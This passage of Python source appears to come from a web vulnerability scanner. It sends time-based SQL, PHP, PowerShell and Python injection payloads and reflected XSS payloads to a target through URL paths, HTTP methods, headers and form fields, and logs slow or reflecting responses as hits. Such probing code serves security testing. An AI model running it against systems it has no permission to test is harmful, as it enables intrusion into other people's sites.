                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"mssql injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"mssql injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"mssql injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"mssql injection in forms: {_} | {field_dict}")

                    except:
                        pass
                                
            # check for mysql injection time based payload
            print(CYAN + f"checking: {_} with mysql injection time based payloads")
            for mal in mal_mysql:
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mysql injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mysql injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mysql injection in method ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mysql injection in method ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mysql injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mysql injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mysql injection in referer ({mal}): {_}")

                except HTTPError as error:
                   if error.code == 504:
                       hits.append(f"mysql injection in referer ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mysql injection in x-forwarded-for ({mal}): {_}")

                except HTTPError as error:
                   if error.code == 504:
                       hits.append(f"mysql injection in x-forwarded-for ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall(r"<input.+?>",form)
                    try:
                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"mysql injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"mysql injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"mysql injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"mysql injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for oracle sql injection time based payload
            print(CYAN + f"checking: {_} with oracle sql injection time based payloads")
            for mal in mal_oracle_sql:
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"oracle sql injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"oracle sql injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"oracle sql injection in method ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"oracle sql injection in method ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"oracle sql injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"oracle sql injection in cookie ({mal}): {_}")

                except:
                    pass
                        
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"oracle sql injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"oracle sql injection in referer ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"oracle sql injection in x-forwarded-for ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"oracle sql injection in x-forwarded-for ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall(r"<input.+?>",form)
                    try:
                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"oracle sql injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"oracle sql injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"oracle sql injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"oracle sql injection in forms: {_} | {field_dict}")

                    except:
                        pass
                                

            # check for php injection time based payload
            print(CYAN + f"checking: {_} with php injection time based payloads")
            for mal in mal_php:
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"php injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"php injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"php injection in method ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"php injection in method ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"php injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"php injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"php injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"php injection in referer ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"php injection in x-forwarded-for ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"php injection in x-forwarded-for ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall(r"<input.+?>",form)
                    try:
                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"php injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"php injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"php injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"php injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for postgresql injection time based payload
            print(CYAN + f"checking: {_} with postgresql injection time based payloads")
            for mal in mal_postgresql:
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"postgresql injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"postgresql injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"posgtresql injection in method ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"postgresql injection in method ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"postgresql injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"postgresql injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"postgresql injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"postgresql injection in referer ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"postgresql injection in x-forwarded-for ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"postgresql injection in x-forwarded-for ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall(r"<input.+?>",form)
                    try:
                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"postgresql injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"postgresql injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"postgresql injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"postgresql injection in forms: {_} | {field_dict}")

                    except:
                        pass
                                
            # check for powershell injection time based payload
            print(CYAN + f"checking: {_} with powershell injection time based payloads")
            for mal in mal_powershell:
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"powershell injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"powershell injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"powershell injection in method ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"powershell injection in method ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"powershell injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"powershell injection in cookie ({mal}): {_}")

                except:
                    pass
                
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"powershell injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"powershell injection in referer ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"powershell injection in x-forwarded-for ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"powershell injection in x-forwarded-for ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall(r"<input.+?>",form)
                    try:
                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"powershell injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"powershell injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"powershell injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"powershell injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for python injection time based payload
            print(CYAN + f"checking: {_} with python injection time based payloads")
            for mal in mal_python_time:
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"python injection time based payload in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"python injection time based payload in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"python injection in method ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"python injection in method ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"python injection time based payload in method: {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"python injection time based payload in method: {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"python injection time based payload in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"python injection time based payload in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"python injection time based payload in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"python injection time based payload in referer ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"python injection time based payload in x-forwarded-for ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"python injection time based payload in x-forwarded-for ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall(r"<input.+?>",form)
                    try:
                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"python injection time based payload in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"python injection time based payload in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"python injection time based payload in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"python injection time based payload in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for reflective xss
            print(CYAN + f"checking: {_} with reflective xss payloads")
            for mal in mal_reflective_xss:
                try:
                    time.sleep(delay)
                    data = text(_ + "/" + mal)
                    if mal in data:
                        hits.append(f"reflective xss in url: {_}/{mal}")

                except HTTPError as error:
                    pass

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"reflective xss in method ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"reflective xss in method ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Cookie",mal})
                    if mal in data:
                        hits.append(f"reflective xss in cookie ({mal}): {_}")

                except HTTPError as error:
                    pass

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Referer",mal})
                    if mal in data:
                        hits.append(f"reflective xss in referer ({mal}): {_}")

                except HTTPError as error:
                    pass

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"X-Forwarded-For",mal})
                    if mal in data:
                        hits.append(f"reflective xss in x-forwarded-for ({mal}): {_}")

                except HTTPError as error:
                    pass

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall(r"<input.+?>",form)
                    try:
                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"reflective xss in forms: {action} | {field_dict}")

                                else:
                                    data = text(_,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"reflective xss in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        pass

                    except:
                        pass

    clear()
    hits = list(set(hits[:]))
    hits.sort()

    if len(hits) > 0:
        for hit in hits:
            print(RED + hit)
            with open("cobra.log", "a") as file:
                file.write(hit + "\n")

    else:
        print(GREEN + f"we didn't find anything interesting on {host}")
        with open("cobra.log", "a") as file:
            file.write(f"we didn't find anything interesting on {host}\n")
